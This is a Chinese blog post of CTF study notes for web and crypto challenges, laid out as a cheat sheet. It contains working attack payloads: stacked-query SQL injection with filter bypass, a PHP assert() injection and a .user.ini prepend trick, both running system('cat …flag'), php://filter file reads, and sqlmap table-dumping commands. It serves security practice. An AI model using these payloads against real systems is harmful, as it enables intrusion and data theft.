---
layout: post
title: "CTF笔记: WEB/CRYPTO"
create: 2019-09-05
update: 2019-09-06
categories: blog
tags: [CTF]
description: "CTF: WEB/CRYPTO"
---

## MD5 为 0eXXXX开头的字符串

```txt
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s1091221200a
0e940624217856561557816327384675

s1502113478a
0e861580163291561247404381396064

s1885207154a
0e509367213418206700842008763514

s1836677006a
0e481036490867661113260034900752

s1184209335a
0e072485820392773389523109082030

s1665632922a
0e731198061491163073197128363787

s532378020a
0e220463095855511507588041205815 
```

## PHP 弱类型示例

```php
"666" == 666.00e-0000
```

## PHP 序列化相关

```php
//数字前有+号不会影响反序列化,但是可以绕过正则表达式
class SeBaFi {
    var $name;
    var $password;
}
$o=new SeBaFi();
$o->password=&$o->name;
echo serialize($o);

// 序列化后的字符串标记的成员数量大于实际数量时可以绕过__wakeup()方法
```

## SQL 注入示例

```sql
select table_schema,table_name from information_schema.tables;

concat('se', 'lect')

1';show tables;

1';show columns from `1919810931114514`;#

1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
```

## PHP assert 语句闭合

```php
<?php
if (isset($_GET['page'])) {
    $page = $_GET['page'];
} else {
    $page = "home";
}
$file = "templates/" . $page . ".php";
// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");
?>

/*构造*/
?page=1','2') === false and system('cat templates/flag.php') and strpos('templates/flag
/*拼接*/
assert("strpos(‘templates/1’, ‘2’) === false and system(‘cat templates/flag.php’) and strpos(‘templates/flag.php’) or die(“Detected hacking attempt!”);
```

## sqlmap 使用

```bash
# 注入测试
    sqlmap -r <file> #file 是请求文件
    sqlmap -u <url>
# 获取数据库列表
    sqlmap -r <file> --dbs
    sqlmap -u <url> --dbs
# 获取数据库中的表
    sqlmap -r <file> -D <database> --tables
# 获取数据表中字段
    sqlmap -r <file> -D <database> -T <table> --columns
# 获取数据表中字段的值
    sqlmap -r <file> -D <database> -T <table> -C <column> --dump
```

## PHP相关

```php
// php服务器中每个目录下有`.user.ini`可以用来单独配置这些php文件
auto_prepend_file=<file> // 在文件前加入<file>的内容
auto_append_file=<file> // 在文件后加入<file>的内容

// 伪造文件头 - exif_imagetype() 绕过
`.user.ini` 
GIF89a
auto_prepend_file=<file>

`<file>`
GIF89a
<script language='php'>system('cat /flag');</script>
```

## PHP 读取任意文件base64编码

```txt
http://url?arg0=php://filter/read=convert.base64-encode/resource=xxx.php
```

## PHP 读取POST.body

```php
file_get_contents('php://input','r');
```

## PHP preg_replace() 漏洞

```php
/**
 * $pattern 以 '/e' 结尾, 则 $replacement 会被当作php代码替换
 */
preg_replace(mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count]]);
```

## 一些常用库

```bash
# env
git clone https://github.com/ius/rsatool.git

git clone https://github.com/D001UM3/CTF-RSA-tool.git
    cd CTF-RSA-tool
    pip install -r "requirements.txt"

git clone https://github.com/Ganapati/RsaCtfTool.git
    cd RsaCtfTool
    pip install -r "requirements.txt"



sudo apt-get install libgmp-dev
sudo apt-get install libmpfr-dev
sudo apt-get install libmpc-dev

pip install libnum
pip install requests
pip install gmpy
pip install gmpy2
pip install pyasn1

# cmd
python rsatool.py -p 23781539 -q 13574881
python rsatool.py -f PEM -o key.pem -n 13826123222358393307 -d 9793706120266356337
python rsatool.py -f DER -o key.der -p 4184799299 -q 3303891593
python solve.py -g --dumpkey --key /mnt/c/users/wcf/Desktop/Temp/ctf_solve/BUUCTF-RSA1/pub.key



# tools on git
git clone https://github.com/lijiejie/GitHack
git clone https://github.com/maurosoria/dirsearch

# commands
python GitHack.py  http://url/.git/
```
